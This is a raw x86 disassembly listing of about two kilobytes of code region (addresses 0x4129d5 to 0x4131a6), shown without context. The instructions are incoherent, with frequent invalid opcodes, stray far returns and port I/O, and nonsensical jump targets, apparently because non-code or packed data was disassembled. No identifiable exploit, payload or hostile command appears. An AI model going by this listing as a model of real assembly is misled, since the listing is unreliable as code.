  4129d5:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4129db:	rol    BYTE PTR [eax],0x55
  4129de:	clc    
  4129df:	fs jb  0x4129e9
  4129e2:	mov    eax,DWORD PTR [ebp-0x30]
  4129e5:	xor    al,0x40
  4129e7:	sub    al,0xc7
  4129e9:	mov    ah,ch
  4129eb:	add    DWORD PTR [ebp+0x4534f845],eax
  4129f1:	sub    al,0x86
  4129f3:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4129fa:	mov    ch,0xff
  4129fc:	clc    
  4129fd:	add    DWORD PTR [ebp+0x60],0x3d
  412a01:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  412a08:	inc    ebp
  412a09:	dec    DWORD PTR [ebx-0x341ff701]
  412a0f:	test   esi,ecx
  412a11:	dec    DWORD PTR [ebx-0x7f8a3301]
  412a17:	push   eax
  412a18:	add    DWORD PTR [ebp+0x0],eax
  412a1b:	dec    ebx
  412a1d:	or     al,0xce
  412a1f:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  412a26:	into   
  412a27:	add    BYTE PTR [ebx-0x34ff1400],cl
  412a2d:	mov    esi,ecx
  412a2f:	sar    bh,0x45
  412a32:	adc    al,0x8b
  412a34:	clc    
  412a35:	fadd   DWORD PTR [ebp+0x0]
  412a38:	mov    ebp,DWORD PTR [edx+0x8]
  412a3b:	push   edi
  412a3c:	adc    BYTE PTR [eax+0x1],0x83
  412a40:	add    al,al
  412a42:	retf   
  412a43:	mov    ecx,esi
  412a45:	cld    
  412a46:	mov    eax,DWORD PTR [eax+0xcb01cc]
  412a4c:	into   
  412a4d:	add    BYTE PTR [ebx+0x756aec00],cl
  412a53:	jne    0x412a88
  412a55:	inc    DWORD PTR [ebx]
  412a57:	rcl    BYTE PTR [ecx+0x50],1
  412a5a:	push   eax
  412a5b:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  412a61:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  412a68:	sar    bh,0x84
  412a6b:	or     BYTE PTR [ebx],al
  412a6d:	push   eax
  412a6e:	add    BYTE PTR [ebx+0x4532c845],cl
  412a74:	pushf  
  412a75:	xor    edi,eax
  412a77:	pushf  
  412a78:	mov    ah,0x89
  412a7a:	test   eax,ebp
  412a7c:	clc    
  412a7d:	inc    ebp
  412a7e:	inc    ebp
  412a7f:	mov    DWORD PTR [eax+eax*8],esi
  412a82:	sub    al,0x30
  412a84:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  412a8b:	dec    ebp
  412a8c:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a90:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  412a96:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a9a:	or     DWORD PTR [ecx+0x45ff085c],0x0
  412aa1:	shl    DWORD PTR [ebp-0x380064],1
  412aa7:	int3   
  412aa8:	lea    eax,[ebp+0x45fff860]
  412aae:	push   eax
  412aaf:	xor    dh,BYTE PTR [ebp-0x64]
  412ab2:	(bad)  
  412ab3:	(bad)  
  412ab4:	pop    esp
  412ab5:	lods   al,BYTE PTR ds:[esi]
  412ab6:	inc    DWORD PTR [ebp+0x4508f8ff]
  412abc:	mov    edi,DWORD PTR [eax+edx*8]
  412abf:	pushf  
  412ac0:	jo     0x412a89
  412ac2:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  412ac9:	inc    ebp
  412aca:	add    BYTE PTR [esi],bh
  412acc:	push   0x8b809c
  412ad1:	in     al,dx
  412ad2:	inc    ebp
  412ad3:	push   ebp
  412ad4:	mov    esi,DWORD PTR [ebx]
  412ad6:	cld    
  412ad7:	add    eax,DWORD PTR [eax+0xf013b]
  412add:	adc    al,0x0
  412adf:	add    bh,bh
  412ae1:	jmp    0xbe2bfe
  412ae6:	add    BYTE PTR [ebp+0x45],cl
  412ae9:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  412aef:	dec    ebp
  412af0:	push   0x38033
  412af5:	cmp    eax,DWORD PTR [eax]
  412af7:	unpcklps xmm7,xmm0
  412afa:	jne    0x412afc
  412afc:	dec    DWORD PTR [ebx+0x5545cc18]
  412b02:	mov    DWORD PTR [ebx],esi
  412b04:	shl    BYTE PTR [ebx],1
  412b06:	inc    ebp
  412b07:	add    ecx,DWORD PTR [ecx+0x60fc803]
  412b0d:	retf   0x5575
  412b10:	dec    DWORD PTR [ebx-0x5ba17e8]
  412b16:	(bad)  
  412b17:	stc    
  412b18:	in     al,dx
  412b19:	or     al,0x85
  412b1b:	dec    ebp
  412b1c:	clc    
  412b1d:	xor    eax,DWORD PTR [ebp+0x3]
  412b20:	mov    ebp,ecx
  412b22:	rol    BYTE PTR [eax],1
  412b24:	inc    ebp
  412b25:	add    BYTE PTR [eax-0x7747ab3],bh
  412b2b:	clc    
  412b2c:	inc    ebp
  412b2d:	retf   
  412b2e:	mov    edx,ebx
  412b30:	in     al,dx
  412b31:	(bad)  
  412b32:	retf   
  412b33:	into   
  412b34:	into   
  412b35:	scas   eax,DWORD PTR es:[edi]
  412b36:	dec    ebp
  412b37:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  412b3d:	sub    ecx,esi
  412b3f:	cmp    ecx,DWORD PTR [ebp+0x77]
  412b42:	(bad)  
  412b43:	mov    edi,eax
  412b45:	int3   
  412b46:	test   DWORD PTR [ecx-0x74baff08],ecx
  412b4c:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  412b53:	xor    eax,DWORD PTR [ebp+0x4503f803]
  412b59:	(bad)  
  412b5b:	retf   0x559c
  412b5e:	(bad)  
  412b5f:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  412b66:	inc    ebp
  412b67:	add    eax,0xeb9c4d3f
  412b6c:	(bad)  
  412b6d:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  412b73:	xor    ecx,DWORD PTR [ebp+0x33]
  412b76:	mov    eax,DWORD PTR [ebx]
  412b78:	call   0xce50f680
  412b7d:	retf   0x55d1
  412b80:	test   BYTE PTR [ebx-0x5ff17fe],cl
  412b86:	jmp    0x412b81
  412b88:	add    BYTE PTR ds:0xebf44d8b,al
  412b8e:	push   ebp
  412b8f:	mov    ebp,DWORD PTR [ebx]
  412b91:	mov    eax,0x33f8558b
  412b96:	retf   
  412b97:	xor    ecx,esi
  412b99:	add    edx,ecx
  412b9b:	add    eax,DWORD PTR [edx+0xca010f]
  412ba1:	push   ebp
  412ba2:	dec    ebp
  412ba3:	mov    ecx,DWORD PTR [ebx-0x34050718]
  412ba9:	stc    
  412baa:	rol    DWORD PTR ds:0xebce4dd6,cl
  412bb0:	scas   eax,DWORD PTR es:[edi]
  412bb1:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  412bb7:	xor    ebp,DWORD PTR [ebx]
  412bb9:	xor    edi,DWORD PTR [ebx]
  412bbb:	add    esi,DWORD PTR [edi+0x3]
  412bbe:	mov    ecx,DWORD PTR [edi]
  412bc0:	clc    
  412bc1:	retf   0x55cb
  412bc4:	into   
  412bc5:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  412bcc:	test   al,0x4d
  412bce:	push   ebp
  412bcf:	jbe    0x412c04
  412bd1:	mov    esi,DWORD PTR [ebx]
  412bd3:	mov    al,0x3
  412bd5:	push   ebp
  412bd6:	add    esi,DWORD PTR [ebx]
  412bd8:	rdpmc  
  412bda:	retf   0x5503
  412bdd:	add    ecx,DWORD PTR [ebx-0x53517f1]
  412be3:	dec    ebp
  412be4:	stc    
  412be5:	mov    ecx,DWORD PTR [eax]
  412be7:	or     BYTE PTR [ebp+0x4d],cl
  412bea:	jmp    0x1352c7a
  412bef:	dec    ebp
  412bf0:	dec    ebp
  412bf1:	(bad)  
  412bf2:	mov    ebx,esp
  412bf4:	clc    
  412bf5:	test   ebx,ecx
  412bf7:	clc    
  412bf8:	ror    DWORD PTR [ebp-0x2a],cl
  412bfb:	mov    esi,ecx
  412bfd:	lock scas eax,DWORD PTR es:[edi]
  412bff:	inc    ebp
  412c00:	mov    esi,DWORD PTR [ebx]
  412c02:	hlt    
  412c03:	pushf  
  412c04:	jge    0x412b91
  412c06:	sub    ebx,esp
  412c08:	cmp    ecx,ebx
  412c0a:	ja     0x412bda
  412c0c:	mov    ebp,DWORD PTR [eax-0x58]
  412c0f:	dec    ebp
  412c10:	xor    ecx,DWORD PTR [di+0x3]
  412c14:	mov    esp,esp
  412c16:	clc    
  412c17:	push   ebp
  412c18:	retf   
  412c19:	mov    dl,bl
  412c1b:	adc    esi,edx
  412c1d:	jb     0x412bed
  412c1f:	add    BYTE PTR [edi-0xb7474b3],ch
  412c25:	lock jge 0x412bf3
  412c28:	sub    ecx,DWORD PTR [ebp+0x3b]
  412c2b:	mov    esi,DWORD PTR [edi-0x20]
  412c2e:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  412c35:	mov    BYTE PTR [ebx-0x34b20729],cl
  412c3b:	mov    edx,ebx
  412c3d:	lock (bad) 
  412c3f:	ror    esi,cl
  412c41:	push   ebp
  412c42:	scas   eax,DWORD PTR es:[edi]
  412c43:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  412c49:	pushf  
  412c4a:	sub    esi,DWORD PTR [edx]
  412c4c:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  412c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c53:	xor    esp,DWORD PTR [ebx]
  412c55:	add    ecx,DWORD PTR [ebp-0x1c]
  412c58:	mov    edi,DWORD PTR [ebp-0x8]
  412c5b:	mov    bl,cl
  412c5d:	cmp    dl,bl
  412c5f:	jb     0x412c2f
  412c61:	add    dh,dl
  412c63:	dec    ebp
  412c64:	scas   eax,DWORD PTR es:[edi]
  412c65:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  412c6b:	shr    DWORD PTR [ebx],cl
  412c6d:	into   
  412c6e:	cmp    edx,esi
  412c70:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  412c76:	dec    ebp
  412c77:	dec    ebp
  412c78:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  412c7e:	retf   
  412c7f:	xor    edx,esi
  412c81:	add    ecx,esi
  412c83:	imul   ecx,edx
  412c86:	mov    DWORD PTR [ebp+0x8],edx
  412c89:	xor    ecx,DWORD PTR [ebp+0x2b]
  412c8c:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  412c92:	add    esi,DWORD PTR [ebx]
  412c94:	rol    BYTE PTR [ebx],0x45
  412c97:	rdtsc  
  412c99:	xlat   BYTE PTR ds:[ebx]
  412c9a:	pushf  
  412c9b:	jge    0x412c26
  412c9d:	xor    esp,eax
  412c9f:	sub    eax,DWORD PTR [ebp-0x73]
  412ca2:	(bad)  
  412ca3:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  412caa:	dec    ebp
  412cab:	xchg   BYTE PTR [ebx],dh
  412cad:	inc    DWORD PTR [ebx]
  412caf:	(bad)  
  412cb0:	jmp    0x412cff
  412cb2:	mov    ecx,DWORD PTR [ebx-0x34341324]
  412cb8:	dec    ebp
  412cb9:	into   
  412cba:	mov    ebp,DWORD PTR [edi-0x23737420]
  412cc0:	pushf  
  412cc1:	shl    DWORD PTR [edx],cl
  412cc3:	retf   0x5588
  412cc6:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412ccc:	add    eax,DWORD PTR [eax]
  412cce:	in     al,0x4d
  412cd0:	push   ebp
  412cd1:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  412cd7:	fs add ch,cl
  412cda:	dec    ebp
  412cdb:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  412ce1:	dec    ebp
  412ce2:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  412ce8:	jge    0x412cb8
  412cea:	mov    BYTE PTR [edi+0xf723b3a],ch
  412cf0:	add    cl,dh
  412cf2:	dec    ebp
  412cf3:	dec    DWORD PTR [ebx-0x2c032301]
  412cf9:	inc    ebp
  412cfa:	push   ebp
  412cfb:	dec    DWORD PTR [ebx-0x73ff1f34]
  412d01:	lea    ebx,[esp+edx*2+0x508bff32]
  412d08:	mov    ah,0x45
  412d0a:	push   ebp
  412d0b:	mov    esi,DWORD PTR [ebx]
  412d0d:	les    esi,FWORD PTR [ebx]
  412d0f:	add    BYTE PTR [ebx],al
  412d11:	inc    DWORD PTR [ebx]
  412d13:	mov    ecx,DWORD PTR [edi]
  412d15:	cld    
  412d16:	retf   0x4d80
  412d19:	add    DWORD PTR [ecx+0x4d30e400],ecx
  412d1f:	jne    0x412cac
  412d21:	(bad)  
  412d22:	in     al,dx
  412d23:	ror    bl,1
  412d25:	scas   al,BYTE PTR es:[edi]
  412d26:	into   
  412d27:	add    BYTE PTR [edi-0xf2f7475],ch
  412d2d:	not    bl
  412d2f:	adc    al,0xca
  412d31:	inc    ebp
  412d32:	push   ebp
  412d33:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  412d39:	push   0xaf80d6
  412d3e:	mov    eax,DWORD PTR [eax]
  412d40:	fdiv   st(7),st
  412d42:	sti    
  412d43:	sbb    dh,cl
  412d45:	pop    esi
  412d46:	xchg   esp,eax
  412d47:	leave  
  412d48:	pushf  
  412d49:	add    al,0x32
  412d4b:	push   ebp
  412d4c:	cmp    ebp,esp
  412d4e:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  412d52:	dec    DWORD PTR [ecx-0x740f0375]
  412d58:	push   ebp
  412d59:	cld    
  412d5a:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  412d60:	retf   0x558b
  412d63:	clc    
  412d64:	xor    esi,eax
  412d66:	add    esi,DWORD PTR [ebp-0x75]
  412d69:	(bad)  
  412d6a:	hlt    
  412d6b:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  412d72:	mov    DWORD PTR [edx],ecx
  412d74:	hlt    
  412d75:	(bad)  
  412d76:	dec    ebp
  412d77:	add    dh,BYTE PTR [ebx]
  412d79:	leave  
  412d7a:	mov    edx,0xffec8d55
  412d7f:	push   ecx
  412d80:	rol    DWORD PTR [ebp+0x55],1
  412d83:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  412d89:	mov    eax,0xf8030b33
  412d8e:	lar    ecx,di
  412d91:	push   ebp
  412d92:	retf   0x863b
  412d95:	jne    0x412d94
  412d97:	mov    edi,edi
  412d99:	or     BYTE PTR [ebp+0x41],dh
  412d9c:	mov    ebp,esp
  412d9e:	cld    
  412d9f:	inc    eax
  412da0:	mov    al,0x25
  412da2:	add    DWORD PTR [ecx+0x0],eax
  412da5:	in     eax,dx
  412da6:	test   DWORD PTR [ecx-0x1],eax
  412da9:	fdiv   st(7),st
  412dab:	ret    0x8b
  412dae:	cld    
  412daf:	mov    eax,DWORD PTR [eax+0x8d0151]
  412db5:	clc    
  412db6:	xor    BYTE PTR [ebp+0x45],al
  412db9:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  412dbf:	loopne 0x412dc0
  412dc1:	mov    edi,edi
  412dc3:	mov    ecx,eax
  412dc5:	clc    
  412dc6:	jne    0x412d98
  412dc8:	call   0x823ed1
  412dcd:	and    eax,0xc6854575
  412dd2:	je     0x412dd5
  412dd4:	mov    eax,esi
  412dd6:	cld    
  412dd7:	or     DWORD PTR [eax+0x401c9],eax
  412ddd:	push   ebp
  412dde:	add    ah,ch
  412de0:	add    BYTE PTR [ecx+0x6a],dl
  412de3:	inc    ebp
  412de4:	push   esi
  412de5:	mov    DWORD PTR [eax-0x4],edx
  412de8:	pop    edi
  412de9:	mov    ebx,DWORD PTR [ebx-0x4]
  412dec:	ret    0xbe
  412def:	push   es
  412df0:	mov    ecx,DWORD PTR [ecx-0x77274af]
  412df6:	clc    
  412df7:	lock inc ebp
  412df9:	jne    0x412e51
  412dfb:	(bad)  
  412dfc:	jne    0x412e02
  412dfe:	mov    eax,0xf841ba66
  412e03:	fadd   QWORD PTR [esi]
  412e05:	(bad)  
  412e06:	jne    0x412e45
  412e08:	cmp    eax,ebx
  412e0a:	pop    esi
  412e0b:	mov    ecx,DWORD PTR [eax]
  412e0d:	push   ecx
  412e0e:	inc    ecx
  412e0f:	lea    esi,[eax-0x8]
  412e12:	inc    edx
  412e13:	inc    ebp
  412e14:	int    0x8b
  412e16:	inc    edx
  412e17:	cld    
  412e18:	jo     0x412dd9
  412e1a:	inc    ecx
  412e1b:	xchg   edx,esp
  412e1d:	mov    ebx,eax
  412e1f:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  412e25:	or     edi,eax
  412e27:	inc    ebp
  412e28:	inc    ebp
  412e29:	(bad)  
  412e2a:	mov    ecx,DWORD PTR [eax]
  412e2c:	cld    
  412e2d:	(bad)  
  412e2e:	jmp    0x412e31
  412e30:	mov    eax,esi
  412e32:	mov    DWORD PTR ds:0x4f8c98b,eax
  412e38:	rcl    BYTE PTR [esi+0xf],1
  412e3b:	iret   
  412e3c:	inc    ebp
  412e3d:	leave  
  412e3e:	(bad)  
  412e3f:	dec    DWORD PTR [ecx]
  412e41:	mov    eax,esi
  412e43:	mov    eax,DWORD PTR [edi]
  412e45:	mov    dh,0xdd
  412e48:	push   es
  412e49:	nop
  412e4a:	(bad)  
  412e4b:	inc    DWORD PTR [ebx]
  412e4d:	push   esi
  412e4e:	leave  
  412e4f:	iret   
  412e50:	add    al,0x46
  412e52:	push   ebp
  412e53:	jmp    0xff928444
  412e58:	inc    ebp
  412e59:	push   esi
  412e5a:	mov    DWORD PTR [esi-0x4],eax
  412e5d:	in     eax,dx
  412e5e:	push   ebp
  412e5f:	sbb    BYTE PTR [eax+0x7c6daff],bh
  412e65:	add    al,BYTE PTR [edx]
  412e67:	mov    edx,DWORD PTR [ebp-0x17]
  412e6a:	cmp    edi,esi
  412e6c:	jne    0x412e6d
  412e6e:	(bad)  
  412e6f:	push   esi
  412e70:	pop    es
  412e71:	push   ebp
  412e72:	mov    ebp,esp
  412e74:	or     BYTE PTR [ebp+0x41],al
  412e77:	add    edi,esp
  412e79:	sub    BYTE PTR [eax-0x4],al
  412e7c:	int3   
  412e7d:	jne    0x412e41
  412e7f:	add    DWORD PTR [eax],eax
  412e81:	sbb    al,0x8b
  412e83:	mov    edx,DWORD PTR [ecx+0x14]
  412e86:	lea    edx,[edx-0x1ba7508]
  412e8c:	push   esi
  412e8d:	enter  0xd375,0xb8
  412e91:	test   DWORD PTR [esi],0x6ce0750
  412e97:	enter  0xd375,0x3b
  412e9b:	neg    DWORD PTR [esi+0x50]
  412e9e:	or     cl,dl
  412ea0:	inc    edx
  412ea1:	(bad)  
  412ea2:	loope  0x412e90
  412ea4:	(bad)  
  412ea5:	sub    eax,DWORD PTR [ebx]
  412ea7:	inc    eax
  412ea8:	loope  0x412efa
  412eaa:	add    dl,BYTE PTR [eax-0x37]
  412ead:	push   edi
  412eae:	push   ebp
  412eaf:	imul   ah
  412eb1:	adc    DWORD PTR [ecx-0x1],0x45
  412eb5:	add    BYTE PTR [ecx+0x55d3fc00],cl
  412ebb:	lea    edi,[eax-0x7fff4ca]
  412ec1:	mov    eax,0x4550402
  412ec6:	cmp    ebp,ecx
  412ec8:	jne    0x412e75
  412eca:	mov    eax,DWORD PTR ds:0x241e808
  412ed0:	in     eax,dx
  412ed1:	add    BYTE PTR [eax-0x7],al
  412ed4:	out    0x36,eax
  412ed6:	inc    ecx
  412ed7:	aas    
  412ed8:	jmp    0xccf15a
  412edd:	lock mov edi,DWORD PTR [ebp-0x18]
  412ee1:	and    edi,edi
  412ee3:	mov    edi,edi
  412ee5:	call   0xe40f2fc1
  412eea:	push   es
  412eeb:	add    al,ch
  412eed:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  412ef4:	(bad)  
  412ef5:	hlt    
  412ef6:	add    eax,0xffd3e87d
  412efb:	cmp    bh,0x8
  412efe:	(bad)  
  412eff:	fld    DWORD PTR [esi]
  412f01:	out    dx,al
  412f02:	call   0xffa02e0a
  412f07:	cmp    al,0x46
  412f09:	shl    edx,0x8
  412f0c:	(bad)  
  412f0d:	pop    es
  412f0e:	fisttp QWORD PTR [ebp+0xe577eff]
  412f14:	push   ebx
  412f15:	add    BYTE PTR [ebx+0x24008b56],cl
  412f1b:	add    BYTE PTR [ebp+0x50],al
  412f1e:	push   eax
  412f1f:	add    DWORD PTR [ebx+0x757d1834],ecx
  412f25:	sub    edx,DWORD PTR [esi-0x24]
  412f28:	jne    0x412ee0
  412f2a:	lods   eax,DWORD PTR ds:[esi]
  412f2b:	mov    edx,DWORD PTR [edx-0x34]
  412f2e:	dec    esi
  412f2f:	out    0x83,eax
  412f31:	into   
  412f32:	push   edi
  412f34:	loopne 0x412f04
  412f36:	shr    BYTE PTR [edx+ecx*4+0x0],1
  412f3a:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  412f41:	rol    DWORD PTR [edx],0x8
  412f44:	mov    esp,ecx
  412f46:	cmp    DWORD PTR [ebx],0xc
  412f49:	mov    esi,0x5001c0
  412f4e:	push   eax
  412f4f:	push   cs
  412f50:	push   eax
  412f51:	(bad)  
  412f52:	sub    edx,edi
  412f54:	push   esi
  412f55:	adc    al,0xcb
  412f57:	ins    DWORD PTR es:[edi],dx
  412f58:	mov    eax,0x203e8
  412f5d:	add    al,ah
  412f5f:	inc    esi
  412f60:	mov    al,ch
  412f62:	pop    es
  412f63:	add    DWORD PTR [eax],0x1
  412f66:	add    dh,al
  412f68:	add    ah,ch
  412f6a:	rol    DWORD PTR [edx-0xd],1
  412f6d:	cli    
  412f6e:	push   0x4a
  412f70:	pop    ecx
  412f71:	retf   0xfe6
  412f74:	add    BYTE PTR [ebx-0x4e72f41e],al
  412f7a:	(bad)  
  412f7b:	dec    BYTE PTR [ebx+0x45b1fc72]
  412f81:	(bad)  
  412f82:	sub    ebp,DWORD PTR [ebx]
  412f84:	and    al,0x52
  412f86:	(bad)  
  412f87:	dec    edi
  412f88:	inc    ebp
  412f89:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  412f90:	add    BYTE PTR [ebp-0x7b],dh
  412f93:	pop    eax
  412f94:	add    BYTE PTR [edx+0x0],bl
  412f97:	pop    edx
  412f98:	dec    ebp
  412f99:	jmp    DWORD PTR [ebx]
  412f9b:	and    al,0xec
  412f9d:	push   edx
  412f9e:	out    0x64,eax
  412fa0:	jmp    0xd3f325a5
  412fa5:	jmp    0x412fff
  412fa7:	mov    al,0xfe
  412fa9:	dec    BYTE PTR [ebp-0x18fd8018]
  412faf:	add    BYTE PTR [esi+ebp*1],bh
  412fb2:	pop    edx
  412fb3:	icebp  
  412fb4:	mov    eax,cs
  412fb6:	ins    BYTE PTR es:[edi],dx
  412fb7:	adc    eax,0x75510000
  412fbc:	mov    esi,0x70158
  412fc1:	or     DWORD PTR [eax-0x74f48dfe],esi
  412fc7:	mov    edi,esp
  412fc9:	cld    
  412fca:	jge    0x413041
  412fcc:	(bad)  
  412fce:	aas    
  412fcf:	and    al,0x6d
  412fd1:	adc    cl,0x1
  412fd4:	mov    eax,DWORD PTR [eax]
  412fd6:	and    ecx,DWORD PTR [ebx-0x167203fd]
  412fdc:	dec    ebp
  412fdd:	add    eax,ebp
  412fdf:	add    BYTE PTR [edx],al
  412fe1:	fadd   DWORD PTR [eax]
  412fe3:	stc    
  412fe4:	enter  0xee00,0x8b
  412fe8:	sbb    eax,0x1
  412feb:	sbb    esi,ecx
  412fed:	in     al,0x0
  412fef:	in     eax,dx
  412ff0:	add    BYTE PTR [eax],al
  412ff2:	jne    0x412f7f
  412ff4:	cmp    edx,esp
  412ff6:	jb     0x413001
  412ff8:	jmp    0x41306f
  412ffa:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  413000:	add    BYTE PTR [ebx+0x4d83d840],cl
  413006:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  41300c:	jb     0x412f97
  41300e:	pop    edx
  41300f:	fadd   QWORD PTR [ebx-0x7445faa1]
  413015:	or     dh,BYTE PTR [edx+0x0]
  413018:	inc    edx
  413019:	or     dl,bh
  41301b:	xlat   BYTE PTR ds:[ebx]
  41301c:	dec    edx
  41301d:	push   edi
  41301e:	add    al,0x7
  413020:	leave  
  413021:	rol    DWORD PTR [edx+eax*1],0x7
  413025:	add    ecx,ecx
  413027:	mov    edx,ecx
  413029:	int3   
  41302a:	jmp    0x412fea
  41302c:	mov    al,0x0
  41302e:	(bad)  
  41302f:	jne    0x413019
  413031:	mov    eax,DWORD PTR [edx]
  413033:	call   0xc155ad38
  413038:	pop    edi
  413039:	add    ebx,DWORD PTR [ecx-0x37]
  41303c:	pop    ecx
  41303d:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  413044:	push   es
  413045:	mov    eax,DWORD PTR [eax]
  413047:	int3   
  413048:	add    ch,al
  41304a:	jae    0x413034
  41304c:	int    0x1
  41304e:	enter  0x3000,0x18
  413052:	add    BYTE PTR [ebp+0x75],al
  413055:	mov    esi,DWORD PTR [eax-0x171f0134]
  41305b:	push   0x2
  41305d:	pop    ecx
  41305e:	add    BYTE PTR [eax],cl
  413060:	push   ebx
  413061:	lea    edi,[edi+eax*2]
  413064:	mov    al,0x1
  413066:	jb     0x413068
  413068:	mov    al,0x10
  41306a:	push   eax
  41306b:	add    al,0x75
  41306d:	add    BYTE PTR [ebx],ch
  41306f:	add    ebx,esp
  413071:	int3   
  413072:	jne    0x413084
  413074:	movsx  edx,cl
  413077:	add    DWORD PTR [eax],eax
  413079:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  413080:	mov    gs,edi
  413082:	add    BYTE PTR [eax-0x50],ch
  413085:	add    al,ch
  413087:	mov    eax,DWORD PTR [ecx]
  413089:	sub    eax,DWORD PTR [eax]
  41308b:	jb     0x413102
  41308d:	add    DWORD PTR [esp+eiz*8-0x50],esi
  413091:	jge    0x41307b
  413093:	add    al,0x1
  413095:	add    DWORD PTR [eax],0x0
  413098:	jne    0x41309a
  41309a:	je     0x4130e1
  41309c:	mov    eax,DWORD PTR [edi]
  41309e:	ror    BYTE PTR [ebp+0x4d],1
  4130a1:	or     DWORD PTR [ecx+0x4d03d004],0x3
  4130a8:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  4130ae:	mov    DWORD PTR [ebx],ebp
  4130b0:	fadd   DWORD PTR [eax+0x75]
  4130b3:	inc    eax
  4130b4:	pop    eax
  4130b5:	lea    ebx,[ecx+0x4f]
  4130b8:	push   0xb1000003
  4130bd:	out    dx,eax
  4130be:	add    ebp,DWORD PTR [edx+edx*2]
  4130c1:	add    BYTE PTR [ebx+ecx*4],bh
  4130c4:	mov    ch,BYTE PTR [ebx]
  4130c6:	jb     0x41313a
  4130c8:	add    al,0x89
  4130ca:	push   eax
  4130cb:	call   0x84297e3d
  4130d0:	add    DWORD PTR [eax+eax*1],eax
  4130d3:	jae    0x4130e9
  4130d5:	icebp  
  4130d6:	inc    ebp
  4130d7:	mov    eax,DWORD PTR gs:[ecx]
  4130da:	int3   
  4130db:	out    dx,al
  4130dc:	loopne 0x41312b
  4130de:	sub    eax,DWORD PTR [edx]
  4130e0:	push   0xffffff83
  4130e2:	pop    esi
  4130e3:	push   cs
  4130e4:	jl     0x4130ff
  4130e6:	add    al,0xaf
  4130e8:	xor    eax,0x832b6d00
  4130ed:	mov    eax,DWORD PTR [edx]
  4130ef:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4130f5:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4130fb:	inc    ebp
  4130fc:	shr    ebx,0x3
  4130ff:	or     DWORD PTR [eax],0x4
  413102:	push   0xffffffa5
  413104:	pop    esi
  413105:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  41310c:	jmp    0x41316b
  41310e:	mov    edi,0xff0272
  413113:	fdivr  QWORD PTR [ebp+0x5d]
  413116:	push   0x4e
  413118:	pop    ecx
  413119:	call   0x41751e
  41311e:	mov    DWORD PTR [ebx],eax
  413120:	in     al,0xc8
  413122:	rol    BYTE PTR [ebp-0x75],0xc1
  413126:	call   0xab3307
  41312b:	pop    esi
  41312c:	enter  0xceff,0x8b
  413130:	repz mov ecx,DWORD PTR [ebp-0x34]
  413134:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  41313b:	je     0x41313d
  41313d:	or     DWORD PTR [ebx-0x74183b24],eax
  413143:	jne    0x413129
  413145:	jmp    0x413140
  413147:	push   DWORD PTR [edx-0x24]
  41314a:	push   0x4d
  41314c:	pop    ecx
  41314d:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  413151:	jge    0x413159
  413153:	mov    eax,eax
  413155:	sub    ebp,DWORD PTR [edx+0x24]
  413158:	pop    esi
  413159:	inc    ebp
  41315a:	mov    esp,0x8b6077
  41315f:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  413165:	lods   al,BYTE PTR ds:[esi]
  413166:	add    BYTE PTR [ebx],bh
  413168:	enter  0xce73,0x49
  41316c:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  413174:	stc    
  413175:	jge    0x4131e9
  413177:	jnp    0xdd40b4d8
  41317d:	call   0xc43253
  413182:	fadd   st(0),st
  413184:	dec    esi
  413185:	ins    BYTE PTR es:[edi],dx
  413186:	stc    
  413187:	cmp    al,0x73
  413189:	push   ebp
  41318a:	mov    eax,0xf8028b
  41318f:	jne    0x413152
  413191:	mov    esi,ecx
  413193:	mov    esp,DWORD PTR [ebp+0x2c]
  413196:	add    edi,DWORD PTR [ebp-0x24]
  413199:	sub    esp,eax
  41319b:	and    al,0x45
  41319d:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4131a3:	sbb    al,0xee
  4131a5:	pop    esi
  4131a6:	call   0x8131d6
